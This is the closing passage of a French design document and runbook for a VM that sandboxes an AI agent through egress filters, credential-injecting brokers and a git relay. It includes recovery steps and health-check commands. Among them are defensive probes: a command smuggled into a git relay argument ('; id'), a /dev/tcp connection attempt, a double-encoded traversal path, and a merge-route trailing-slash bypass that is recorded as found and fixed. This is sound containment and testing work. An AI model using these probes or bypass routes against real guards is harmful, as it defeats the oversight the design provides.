| Renouvellement du jeton du broker par timer (TokenRequest) | Pour frapper un jeton il faut un credential, et le seul que le broker détiendrait *est* le jeton : au mieux un jeton long qui en produit des courts, avec une unité, un timer et un mode de panne en plus. | Le jour où le cluster sait émettre un jeton sans secret d'amorçage (identité de charge de travail, OIDC). |
| RBAC du broker appliqué par le play | Le dépôt ne possède pas le cluster, et l'appliquer exigerait d'y laisser un kubeconfig d'admin sur le poste. Le manifeste est livré, la pose appartient au déploiement. | Le jour où le projet déploie aussi le cluster. |
| Jeton du broker **domicilié dans un coffre** (OpenBao/Vault, source de vérité, matérié par ESO) | Le cluster **frappe** ce jeton : le contrôleur remplit `.data.token` et la valeur est signée par l'apiserver — un coffre ne peut donc pas en être la source, seulement un second domicile. Et la livraison par ESO supposerait que la VM **lise un Secret k8s**, c'est-à-dire le contrôle même que ce design ferme : le credential du broker ne peut pas venir par le broker. | Un IdP externe authentifiant l'apiserver (OIDC), ou le jour où un composant de la VM renouvellerait lui-même son jeton (voir la ligne TokenRequest). |
| Renouvellement automatique du jeton (CronJob cluster + PushSecret + timer sur la VM) | Quatre composants et deux secrets de plus pour renouveler **un** credential en lecture seule, loopback seul, illisible par l'agent — dont la vraie mitigation est la **révocation** (supprimer le Secret invalide l'ancien jeton immédiatement), pas la rotation. | Une exigence de conformité qui impose une durée de vie bornée. |
| Broker git en HTTP seul (nginx + `Basic` sur `/<owner>/<repo>.git/`, le plan initial) | La forge de ce déploiement ne sert **que** le SSH, et le git HTTP change de chemin, de port et de politique selon la forge là où le SSH a la même forme partout. Surtout : **aucun proxy ne peut injecter dans un canal chiffré**. | Le jour où une forge n'exposerait que le HTTP — le design revient alors à une simple `location` d'injection, déjà supportée. |
| Le terminateur SSH remplacé par mitmproxy, déjà déployé | Un addon est du **code** là où `proxy_set_header` est de la configuration, et router un jeton de broker à travers le proxy L7 brouillerait la frontière que la Phase 3 a posée. | Le jour où l'injection demanderait de la logique (signature, transformation de corps). |
| `lfs.url` global, ou `insteadOf` seul, pour ramener LFS sur le loopback | `lfs.url` est **global** — il ne vaut que pour un seul dépôt, alors que le broker en autorise une liste ; et mesuré, `insteadOf` ne réécrit pas l'endpoint batch. Le relais répond `git-lfs-authenticate` : par dépôt, et sans secret. | Le jour où git-lfs cesserait d'appeler `git-lfs-authenticate` sur un remote SSH. |
| Une clé SSH utilisable dans la zone agent (clé de déploiement en écriture, bornée par la protection de branche) | C'est la tentation la moins chère, et elle viole §0 : la clé serait **exfiltrable et réutilisable depuis l'extérieur**, donc un credential persistant à révoquer — là où celle du broker ne quitte jamais la VM. | Une forge sans aucune protection de branche, où le bornage n'existerait de toute façon plus. |
| Ligne de repli `SSH_ORIGINAL_COMMAND` dans le relais | **Morte, et pas seulement aujourd'hui** : sshd ne pose cette variable que sous une commande *forcée*, et il exécute alors la commande forcée par `<shell> -c` — `argv[2]` est donc **non vide** et la variable n'est jamais lue (`man sshd_config`, *ForceCommand*). Elle ne peut pas sauver la bascule qu'elle semble protéger, et le contrôle d'effet du rôle (`ls-remote` sous l'uid du harnais) casserait bruyamment si la commande arrivait un jour ailleurs. | Jamais : le chemin n'existe pas. |
| Nettoyage des blocs d'injection à deux bornes (`< 1` ou `> N`) | Le `< 1` **n'est pas mort** : `int` rend **0** pour un nom qui n'est pas un nombre, et c'est la seule clause qui retire un `.conf` étranger. La condition dit donc son intention une fois — `not in range(1, N+1)` — au lieu de deux bornes dont l'une paraît morte sans l'être. | Le jour où le rôle cesserait d'écrire `1.conf`…`N.conf`. |
| Clause `/+$` du contrôle d'unicité des dépôts (`git_broker_repos`) | **Morte** : l'item voisin de la même assertion refuse tout `/` final (`select('search', '/$') \| length == 0`), donc retirer les slashes finaux ne peut jamais changer le verdict — mesuré sur huit formes d'entrée, slash final et doublon avec slash final compris (verdicts identiques). Le message d'échec annonçait pourtant « a trailing slash are dropped » : il est corrigé, et la condition tient désormais sur **une ligne** (143 car.). | Le jour où l'item « pas de slash final » quitterait ce `that:`. |
| Ajouter le verbe `git-upload-archive` au relais (`git archive --remote`) | **Forgejo l'accepte** (`allowedCommands` → `AccessModeRead`, comme `git-upload-pack`), donc l'ajouter ouvrirait réellement quelque chose — et ça n'apporterait rien : par défaut `git-upload-archive` ne sert qu'un arbre pointé **directement par une ref**, ou un sous-arbre `ref:path`, c'est-à-dire exactement ce que l'agent a déjà par `clone`. Le seul gain serait la bande passante d'une extraction sans copie, or l'agent est précisément celui qui doit en détenir une pour proposer une branche. Et le rayon dépend d'un réglage **côté forge** — `uploadarchive.allowUnreachable`, défaut `false`, dont git dit lui-même qu'il protège « the privacy of objects that have been removed from history but may not yet have been pruned » : à `true`, un client demande des sha1 arbitraires, donc l'historique réécrit. Enfin GitHub **refuse** ce verbe et le git-HTTP ne le transporte pas : ce serait une capacité dépendante de la forge, à l'inverse de la raison qui a fait choisir SSH. | Le jour où un harnais exigerait `git archive --remote` (extraire un sous-arbre d'un très gros dépôt sans le cloner) : l'implémentation est **un mot** dans le `case` du relais — `$# -eq 2` tient, les arguments de l'archive passent dans le protocole — et il faut alors **vérifier sur la forge** que `uploadarchive.allowUnreachable` est à `false`. |
| Reprise (migration) d'une VM déjà provisionnée après le renommage du compte (`harness_name` → `agent_name`, défaut `agent`) | Le compte est créé **par nom**, jamais renommé : une reprise devrait connaître le nom précédent et le raisonner dans chaque rôle, pour trois artefacts indexés par ce nom (`/etc/subuid` et `/etc/subgid` en `lineinfile`, `/etc/sudoers.d/<nom>`, `/var/lib/systemd/linger/<nom>`) — et la VM de dev se recrée. | Le jour où une VM **en service** devrait changer de nom de compte : `userdel -r` de l'ancien, retrait des trois artefacts, puis le play. |
| Écrire nous-mêmes la plage subuid/subgid de l'agent (`lineinfile`, plage fixe `100000:65536`) | **Retiré le 20/09/2026** : `useradd` alloue déjà une plage à la création — `/etc/login.defs` de l'image la déclare (`SUB_UID_MIN 100000`, `SUB_UID_COUNT 65536`, idem GID), vérifié par un compte jetable (`useradd` écrit la ligne, `userdel -r` la retire). La plage fixe du rôle était **celle d'`ubuntu`** : le jeu d'uids filtré incluait donc `100000-165535`, ce qui filtrait les conteneurs d'`ubuntu` avec ceux de l'agent, et faisait partager un espace d'uid aux deux acteurs. | Le jour où une image cesserait de déclarer `SUB_UID_*` : `podman` refuse alors de démarrer un conteneur rootless (échec bruyant, pas un filtre contourné), et l'allocation redevient une tâche explicite. |
| Télécharger `runsc` en binaire depuis `…/release/latest/<arch>/runsc` | **Morte** : depuis le 16/09/2026 gVisor ne publie plus de binaire par plateforme, seulement `gvisor.tar.zstd` et `gvisor.tar.bz2` (avec leurs `.sha512`) — mesuré dans le bucket, cinq versions datées comprises, toutes en 404. Le rôle prend la voie que la doc amont qualifie de *future-proof*, son **dépôt apt signé** : `runsc` en `/usr/bin`, les sidecars dans `/usr/bin/gvisor-bin/` (que `runsc` cherche à côté de son propre binaire), un `postinst` qui ne touche qu'à Docker s'il est présent, et une clé ASCII en `0644` — mesuré : `gpg --dearmor` la crée en `0640`, illisible par `_apt`, et apt refuse alors le dépôt. | Jamais : l'ancienne arborescence n'existe plus. L'archive seule (`sha512sum -c`, `tar --zstd`) reste la solution documentée à rouvrir si une politique interdisait un jour une source apt tierce. |
| Serveurs MCP devant les relais (k8s, forge, observabilité) | **Le protocole ne déplace ni le placement ni la borne.** Ce qui protège le jeton est l'uid et le home `0700` de la zone de confiance, pas l'interface — et un serveur MCP en **stdio** est lancé par le client, donc *dans la zone agent, avec le credential dedans* : l'invariant tombe. « Proposer, jamais appliquer » ne s'exprime pas davantage en MCP, où un serveur exposant `merge_pr` déplacerait la politique dans la **disponibilité d'un outil** — plus fragile que la protection de branche, qui tient même si l'outil existe. Le gain réel (découvrabilité, champs typés, réponses bornées) ne se paie que sur les capacités en **forme de question métier**, pas sur les CLI natives que le modèle connaît déjà (git, kubectl) ni sur les API où l'agent doit pouvoir demander n'importe quoi (PromQL). | Le jour où une réponse **bornée et connue d'avance** manquerait vraiment — l'Alertmanager, dont l'API v2 est peu représentée dans l'entraînement, est le meilleur candidat. Alors : un frontal **mince et sans secret**, qui appelle le loopback où l'injection a lieu, et qui peut donc vivre dans la zone agent sans casser l'invariant. Jamais un serveur tiers avec le jeton dedans, et jamais avant qu'un besoin mesuré le justifie. |

---

## ⚡ 5. Guide de reprise rapide

### 🔗 Accès SSH

```bash
ssh <admin>@<vm_ip>              # admin
ssh {{ agent_name }}@<vm_ip>   # zone agent
```

### 🚑 Accès perdu, sans console

Aucun compte de la VM n'a de mot de passe : la console Proxmox n'est **pas** une porte de secours. L'agent invité QEMU en est une — il est provisionné par ce projet :

```bash
qm list                          # le VMID
qm guest exec <vmid> -- /bin/bash -c 'systemctl is-active ssh; fail2ban-client status sshd | tail -6; uptime -p'
qm guest exec <vmid> -- /usr/bin/fail2ban-client set sshd unbanip <votre-ip>   # ban fail2ban
qm guest exec <vmid> -- /usr/bin/systemctl start ssh                           # sshd arrêté
# Un mot de passe de console, sans toucher à SSH (PasswordAuthentication reste à no) :
qm guest exec <vmid> -- /bin/bash -c "echo '<compte>:<mot-de-passe>' | chpasswd"
```

**Le piège, mesuré** : la prison SSH est en `mode = aggressive` — une connexion qui **ne s'authentifie pas** compte déjà comme un échec. Cinq échecs dans les dix minutes précédentes (un test de port répété suffit, et une VM qui redémarre en produit aussi) valent **une heure de ban**. D'où `security_hardening_fail2ban_ignoreip`, qui doit nommer le poste de contrôle.

**L'autre piège, mesuré** : `ufw limit 22/tcp` compte **6 connexions neuves par 30 s et par source** (`recent`, `hit_count 6`). Une rafale de sessions — une campagne de vérifications qui enchaîne les `ssh`, par exemple — se voit refuser la suivante, et le refus est un **`Connection refused` immédiat**, à ne pas confondre avec un ban : celui-ci retombe seul en une trentaine de secondes, là où le ban fail2ban tient une heure et exige `unbanip`.

**Le troisième, mesuré le 21/09/2026** : un play interrompu **après** la levée du filtre d'egress laisse la zone agent **ouverte** (`nft list tables` sans `inet agent_egress`), et `systemctl start agent-egress` **ne la referme pas** — l'unité `oneshot` est déjà `active (exited)`, donc `start` ne fait rien. Le geste est `systemctl restart agent-egress`, à confirmer par `nft list chain inet agent_egress output | grep -c 'dport 22'` (**attendu : 4**). La fenêtre a duré une dizaine de minutes le temps d'un diagnostic : c'est le mode d'échec que le §0 assume (*fail-open*) pour un run qui casse avant `agent_egress`, et il vaut mieux le reconnaître vite que de croire la zone fermée.

**Le second piège, mesuré** : l'`sshd` **système** garde les pénalités de source d'OpenSSH 10 (`persourcepenalties … authfail:5 min:15 max:600`). Une connexion qui n'authentifie pas compte comme un échec, chaque échec ajoute 5 s de refus **pour votre IP**, et un client qui réessaie en boucle (agent SSH vide, `BatchMode=yes`) **entretient** la pénalité : `Permission denied (publickey)` *après* que le serveur a reconnu la clé (`Server accepts key`). Il n'y a rien à débloquer — **attendre** une quinzaine de secondes suffit, et réessayer ne fait que prolonger. Preuve dans le journal : `journalctl -u ssh | grep srclimit`.

### 🧪 Vérifications de santé

```bash
# Sandbox gVisor (conteneurs lancés par l'agent)
ssh {{ agent_name }}@<vm_ip> "docker run --rm alpine uname -a"
# Attendu : Linux ... 4.19.0-gvisor ...

# Gateway d'inférence (Phase 2), depuis la zone agent : les alias déclarés
ssh {{ agent_name }}@<vm_ip> "curl -s http://127.0.0.1:4000/v1/models"
# Le port amont du provider est fermé à la zone agent — attendu en échec (rc=28)
ssh {{ agent_name }}@<vm_ip> "curl -m 4 -sS -o /dev/null -w '%{http_code}\n' http://127.0.0.1:11434/api/tags"
# Le port SSH de l'hôte (22) est fermé de la même façon — le drop est silencieux : ça EXPIRE au lieu de
# refuser, donc un rc=124 est le filtre qui marche, pas une panne réseau
ssh {{ agent_name }}@<vm_ip> 'timeout 4 bash -c "exec 3<>/dev/tcp/127.0.0.1/22"; echo rc=$?'   # attendu : rc=124
ssh <admin>@<vm_ip> "nft list chain inet agent_egress output | grep -c 'dport 22'"              # attendu : 4 règles
# Le gateway tourne-t-il bien hors de l'uid du harnais ?
ssh <admin>@<vm_ip> "systemctl show inference-gateway -p User -p ActiveState"

# Egress (Phase 1) : la zone agent ne sort pas, le loopback reste ouvert
ssh {{ agent_name }}@<vm_ip> "curl -m 3 -sS -o /dev/null -w '%{http_code}\n' https://example.com"
# Attendu : échec (résolution comprise).
# Conteneur couvert par le même filtre :
ssh {{ agent_name }}@<vm_ip> "podman run --rm alpine wget -T3 -q -O- http://1.1.1.1"
# Le filtre est-il RÉELLEMENT chargé ? (un run interrompu le laisse levé)
ssh <admin>@<vm_ip> "sudo nft list table inet agent_egress"

# Proxy egress L7 (Phase 3) : l'allowlist tient, et le proxy est le SEUL chemin
ssh {{ agent_name }}@<vm_ip> "curl -m 5 -sS -x http://127.0.0.1:8080 https://<domaine_allowlisté>"
# Attendu : 200. Hors allowlist ou destination interne : 403 (« CONNECT tunnel failed, response 403 »).
# Sans proxy, la zone agent ne sort plus et ne résout plus : le proxy est bien le seul chemin.
ssh {{ agent_name }}@<vm_ip> "curl -m 4 -sS -o /dev/null -w '%{http_code}\n' https://<domaine_allowlisté>"
ssh {{ agent_name }}@<vm_ip> "getent hosts <domaine_allowlisté> || echo 'pas de résolution'"
# Le proxy tourne-t-il hors de l'uid du harnais, et que décide-t-il ? (une ligne par requête)
ssh <admin>@<vm_ip> "systemctl show egress-proxy -p User -p ActiveState; journalctl -u egress-proxy -g 'egress-(allow|deny)' -n 20"

# Durcissement du harnais (après Phase 8)
systemd-analyze security {{ agent_name }}.service

# Broker Kubernetes (Phase 4) : la zone agent n'a qu'une adresse, jamais le jeton
ssh {{ agent_name }}@<vm_ip> "curl -s http://127.0.0.1:8001/api"
# Attendu : la liste des versions de l'API. Une écriture est refusée DEUX fois : par le filtre du
# proxy (403) puis par le RBAC ; les chemins secrets/exec/portforward le sont aussi.
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' -X DELETE http://127.0.0.1:8001/api/v1/namespaces/sre-agent/configmaps/x"
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8001/api/v1/namespaces/sre-agent/secrets"
# Le broker tourne-t-il hors de l'uid du harnais, avec un jeton qui authentifie ?
ssh <admin>@<vm_ip> "systemctl show k8s-broker -p User -p ActiveState"
ssh <admin>@<vm_ip> "journalctl -u k8s-broker -n 20"
# Ce que le jeton peut réellement faire — côté cluster, avec le kubeconfig du broker
kubectl --kubeconfig=ansible/files/k8s-broker.kubeconfig auth can-i --list

# Broker git (Phase 5) : l'agent propose, ne détient rien, et n'obtient aucun shell
ssh {{ agent_name }}@<vm_ip> "git ls-remote ssh://git-broker/<owner>/<repo>.git"
# Attendu : les références du dépôt. La clé du harnais n'ouvre QUE le relais, et le relais ne rejoue
# rien de ce qui arrive : un dépôt non déclaré, un shell, et tout argument surnuméraire sont refusés.
ssh {{ agent_name }}@<vm_ip> "ssh git-broker id"                 # attendu : refusé
ssh {{ agent_name }}@<vm_ip> "ssh git-broker \"git-upload-pack '/<owner>/<repo>.git' ; id\""   # attendu : refusé
ssh <admin>@<vm_ip> "journalctl -t git-broker -n 20"               # une ligne par refus
# Les deux portes tournent hors de l'uid du harnais, sur le loopback seul
ssh <admin>@<vm_ip> "systemctl show git-broker-ssh -p User -p ActiveState; systemctl show token-proxy -p User -p ActiveState"
ssh <admin>@<vm_ip> "ss -tlnp | grep -E '2222|8002'"
# La moitié HTTP : le jeton est injecté par le proxy, l'agent n'en détient aucun — et l'API du COMPTE
# n'est pas routée : seuls les dépôts déclarés le sont, en lecture (GET sur le préfixe du dépôt, ce
# qui inclut ce que la forge y expose : hooks, collaborateurs, logs de jobs — cf. risque 12) et en
# proposition (GET/POST/PATCH sur /pulls et /issues, cf. git_broker_api_proposal_methods).
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8002/api/v1/repos/<owner>/<repo>"          # attendu : 200
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' -X DELETE http://127.0.0.1:8002/api/v1/repos/<owner>/<repo>"   # attendu : 403
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8002/api/v1/user/keys"                   # attendu : 404
# Les chemins déclarés sont BORNÉS : un dépôt dont le nom allonge un nom déclaré n'est pas routé
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8002/api/v1/repos/<owner>/<repo>-x"       # attendu : 404
# Et un chemin doublement encodé est refusé : l'emplacement est choisi sur l'URI normalisée, l'URI
# brute part vers la forge, donc un %25 dit deux choses à deux endroits (--path-as-is, sinon curl
# normalise). Le %2F, lui, reste admis : les deux côtés le lisent comme un séparateur (GitLab l'exige).
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' --path-as-is 'http://127.0.0.1:8002/api/v1/repos/<owner>/<repo>/%252e%252e%252fx'"   # attendu : 403
# Le merge est fermé par le proxy (location regex, donc avant la location préfixe) — 403 attendu partout
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' -X POST -H 'Content-Type: application/json' -d '{}' http://127.0.0.1:8002/api/v1/repos/<owner>/<repo>/pulls/1/merge"   # attendu : 403
# La CRÉATION de PR reste ouverte : même famille de chemin, route et verbe différents — la réponse vient
# alors de la forge (4xx), pas du proxy (403), et c'est ça qui distingue les deux
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' -X POST -d '{}' http://127.0.0.1:8002/api/v1/repos/<owner>/<repo>/pulls"   # attendu : 4xx de la forge
# Famille du garde, essayée sur la forge le 20/09/2026 : `/pulls/1%2Fmerge` était déjà refusée, mais
# `/pulls/1/merge/` FRANCHISSAIT le garde — le handler de merge de la forge répondait à une requête
# admise (`{"Do":"pas-un-do"}` → 422 de validation du champ `Do`), donc un corps valide aurait mergé.
# Motif corrigé en `merge/*$` : les huit formes (slash final simple, double, `/./`, `%2F`, `01`) sont
# refusées, et ce qui doit rester ouvert le reste (`GET` dépôt 200, `POST /pulls` → 4xx de la forge)
ssh {{ agent_name }}@<vm_ip> "curl -s --path-as-is -o /dev/null -w '%{http_code}\n' -X POST -H 'Content-Type: application/json' -d '{}' http://127.0.0.1:8002/api/v1/repos/<owner>/<repo>/pulls/1/merge/"   # attendu : 403
# La trace du proxy est dans le journal de son unité (bornée par journald, plus de fichier)
ssh <admin>@<vm_ip> "journalctl -u token-proxy -n 20"

# Relais d'observabilité : lecture seule, et trois lectures fermées par leur nom
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8002/api/v1/status/buildinfo'"     # attendu : 200
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8002/api/v2/alerts?active=true'"   # attendu : 200
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8002/api/search?type=dash-db'"     # attendu : 200, jeton Grafana injecté
# L'écriture tombe par la MÉTHODE, pas par une règle : un silence comme une annotation
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' -X POST -d '{}' http://127.0.0.1:8002/api/v2/silences"     # attendu : 403
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' -X POST -d '{}' http://127.0.0.1:8002/api/annotations"    # attendu : 403
# Les lectures dangereuses sont fermées par leur nom (location regex avant le préfixe)
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8002/api/datasources/proxy/1/api/v1/query"  # attendu : 403
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8002/api/v1/status/config"                  # attendu : 403
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8002/api/admin/settings"                   # attendu : 403
# Bornes de préfixe et en-tête de l'agent : hors préfixe 404, et le Bearer envoyé par l'agent est ÉCRASÉ
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8002/api/v1x/query"                        # attendu : 404
ssh {{ agent_name }}@<vm_ip> "curl -s -o /dev/null -w '%{http_code}\n' -H 'Authorization: Bearer bidon' 'http://127.0.0.1:8002/api/search?type=dash-db'"  # attendu : 200
# Les trois sondes du primitif (contrôle d'effet du play) et la disparition des blocs à la désactivation
ssh <admin>@<vm_ip> "ls /etc/token-proxy/injections/"    # 6 blocs : 3 du broker git, 3 des relais
# Puis : observability_relay_enabled: false, un run, et les blocs 4..6 ont disparu (nettoyage de liste)
# Côté forge : la protection de branche refuse un push direct sur la branche par défaut
# LFS passe par le même proxy — Forgejo/GitLab seulement, GitHub délègue ses transferts à S3

# Validation du code local
tofu -chdir=iac validate && ansible-lint
```

### 📌 Point de départ recommandé

**Phases 0, 1, 2, 3, 4 et 5 faites** (documentation corrigée ; egress de la zone agent filtré ; gateway d'inférence en zone de confiance ; proxy L7 à allowlist, deux niveaux ; broker Kubernetes en lecture seule ; broker git avec transport SSH ré-originé, proxy d'injection générique, API et LFS — les trois brokers et le proxy tournant sous la zone de confiance). Prochaine étape : **Phase 7** (observabilité : elle porte la piste d'audit des prompts, l'audit des routes d'admin du gateway, la cible commune des journaux du proxy L7 et des brokers, et les trois chemins loopback que l'agent a désormais : `8001`, `2222`, `8002`). **Phase 8** une fois le harnais choisi et installable — c'est elle qui portera l'outillage dans l'image du harnais.
